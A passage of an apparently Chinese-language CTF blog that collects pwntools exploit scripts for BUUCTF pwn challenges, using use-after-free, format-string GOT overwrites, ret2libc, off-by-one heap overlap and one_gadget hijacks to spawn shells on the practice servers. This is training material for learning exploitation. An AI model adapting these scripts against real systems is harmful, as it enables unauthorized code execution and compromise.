class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="pwnable-hacknote"><a href="#pwnable-hacknote" class="headerlink" title="pwnable_hacknote"></a>pwnable_hacknote</h2><p>基本uaf</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">myelf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25639</span>)</span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"></span><br><span class="line">put_got=myelf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,content</span>):</span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;size :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">io.recvuntil(<span class="string">&quot;Content :&quot;</span>)</span><br><span class="line">io.sendline(content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">num</span>):</span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">num</span>):</span><br><span class="line">io.recvuntil(<span class="string">&quot;choice :&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">io.sendline(<span class="built_in">str</span>(num))</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">pause()</span><br><span class="line">add(<span class="number">64</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">add(<span class="number">32</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">64</span>,<span class="string">&quot;&quot;</span>)</span><br><span class="line">pause()</span><br><span class="line">pause()</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libc_base = u32(io.recv(<span class="number">8</span>)[<span class="number">4</span>:<span class="number">8</span>])-<span class="number">0x1b07b0</span></span><br><span class="line"></span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">8</span>,p32(system_addr)+<span class="string">b&quot;;sh\x00&quot;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="mrctf2020-easy-equation"><a href="#mrctf2020-easy-equation" class="headerlink" title="mrctf2020_easy_equation"></a>mrctf2020_easy_equation</h2><p>之前遇到这种格式化字符串把某个地址改成指定的值都是直接fmtstr_payload直接生成的，不过这题不行了，看来还是得自己写</p><p>解出来方程是2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29917</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;+fmtstr_payload(8, &#123;0x60105C:0x2&#125;) 不能用</span></span><br><span class="line">payload = <span class="string">b&quot;aa%9$nAAA&quot;</span>+p64(<span class="number">0x60105c</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="ciscn-2019-es-7"><a href="#ciscn-2019-es-7" class="headerlink" title="ciscn_2019_es_7"></a>ciscn_2019_es_7</h2><p>这个和之前有个题一样</p><h2 id="picoctf-2018-got-shell"><a href="#picoctf-2018-got-shell" class="headerlink" title="picoctf_2018_got_shell"></a>picoctf_2018_got_shell</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26671</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&#x27;value?&#x27;</span>)</span><br><span class="line">p.sendline(<span class="built_in">hex</span>(puts_got))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="built_in">hex</span>(<span class="number">0x804854b</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()         </span><br></pre></td></tr></table></figure><h2 id="cmcc-pwnme2"><a href="#cmcc-pwnme2" class="headerlink" title="cmcc_pwnme2"></a>cmcc_pwnme2</h2><p>这题的偏移搞了挺久，当时一看这个不就是一个retlibc吗，然后自信写板子，结果一直卡在一个地方，结果发现是gets下面那个函数的ret是会ret到前一个gets ebp在栈上面的位置，最后调试发现位置是0x6c</p><p>附上exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25747</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">puts_plt=elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got=elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">offset=<span class="number">0x6c</span></span><br><span class="line">main_addr=<span class="number">0x080486f8</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*(offset+<span class="number">4</span>)+p32(puts_plt)+p32(main_addr)+p32(puts_got)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;input:\n&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">b&#x27;\x0a&#x27;</span>)</span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;\x0a&#x27;)</span></span><br><span class="line"><span class="comment">#p.recvuntil(b&#x27;\x0a&#x27;)</span></span><br><span class="line">leak_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(leak_addr))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&quot;puts&quot;,leak_addr)</span></span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/yfy/ctfpwn/glibc-all-in-one/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=leak_addr-libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">bin_sh_addr=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*offset+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(main_addr)+p32(bin_sh_addr)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="wdb-2018-2nd-easyfmt"><a href="#wdb-2018-2nd-easyfmt" class="headerlink" title="wdb_2018_2nd_easyfmt"></a>wdb_2018_2nd_easyfmt</h2><p>找不到远程的libc版本，算了，本地打自己的libc是通的</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;i386&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25868</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.23-0ubuntu11.3_i386/libc-2.23.so&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Do you know repeater?\n&#x27;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;%39$p&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">0x18647</span></span><br><span class="line"></span><br><span class="line">log.success(<span class="string">f&quot;leak=<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">log.success(<span class="string">f&quot;libc_base=<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">printf=libc_base+libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload2=(fmtstr_payload(<span class="number">6</span>, &#123;printf_got:system&#125;))</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="roarctf-2019-easy-pwn"><a href="#roarctf-2019-easy-pwn" class="headerlink" title="roarctf_2019_easy_pwn"></a>roarctf_2019_easy_pwn</h2><p>通过off-by-one造成堆重叠，从而泄露libc和改写realloc为one_gadget，注意这题还要把molloc改写为realloc达成一些one_gadget的条件</p><blockquote><p>buu的题，本地用的libc可以打通，远程会超时,大概是libc不对,懒得找了</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#p=remote(&quot;node5.buuoj.cn&quot;,26221)</span></span><br><span class="line">p=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/yfy/tools/glibc-all-in-one/libs/2.23-0ubuntu3_amd64/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;./libc-2.23.so&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice:&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice:&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice:&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">b&quot;choice:&quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;index:&#x27;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x90</span>)</span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x18</span>+p8(<span class="number">0xc1</span>)</span><br><span class="line">edit(<span class="number">0</span>,<span class="number">0x18</span>+<span class="number">10</span>,payload)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line">show(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">leak=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">log.success(<span class="string">f&quot;leak&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(leak)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc_base=leak-<span class="number">0x3c3b78</span></span><br><span class="line">log.success(<span class="string">f&quot;libc_base&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(libc_base)&#125;</span>&quot;</span>)</span><br><span class="line">one_gadget=libc_base+<span class="number">0x4525a</span> <span class="comment">#0x4525a  0xef9f4 0xf0897</span></span><br><span class="line"><span class="comment">#one_gadget=libc_base+0x4526a #0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">fake_addr=libc_base+<span class="number">0x3c3aed</span></span><br><span class="line"></span><br><span class="line">fake=p64(fake_addr)</span><br><span class="line">log.success(<span class="string">f&quot;fake&gt;&gt;&gt;<span class="subst">&#123;<span class="built_in">hex</span>(fake_addr)&#125;</span>&quot;</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">edit(<span class="number">2</span>,<span class="built_in">len</span>(fake),fake)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;b&#x27;</span>*<span class="number">0xb</span>+p64(one_gadget)+p64(realloc)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">add(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="npuctf-2020-easyheap"><a href="#npuctf-2020-easyheap" class="headerlink" title="npuctf_2020_easyheap"></a>npuctf_2020_easyheap</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">p = remote(<span class="string">&quot;node5.buuoj.cn&quot;</span>,<span class="number">29440</span>)</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;./libc-2.27.so&quot;</span>)</span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">free_got = elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cmd</span>(<span class="params">choice</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Your choice :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(choice))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create</span>(<span class="params">size,content</span>):</span><br><span class="line">cmd(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;only) :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">cmd(<span class="number">2</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">p.recvuntil(<span class="string">&quot;Content:&quot;</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">3</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">cmd(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Index :&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">create(<span class="number">0x18</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">payload += p64(<span class="number">0x41</span>)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#create(0x38,b&#x27;a&#x27;)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span> * <span class="number">0x20</span> + p64(<span class="number">0x38</span>) + p64(free_got)</span><br><span class="line">create(<span class="number">0x38</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">free_addr = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">log.success(<span class="built_in">hex</span>(free_addr))</span><br><span class="line">libc_base = free_addr - libc.sym[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">log.success(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">log.success(<span class="built_in">hex</span>(system))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(system))</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="picoctf-2018-can-you-gets-me"><a href="#picoctf-2018-can-you-gets-me" class="headerlink" title="picoctf_2018_can_you_gets_me"></a>picoctf_2018_can_you_gets_me</h2><p>ROPgadget一把梭</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span 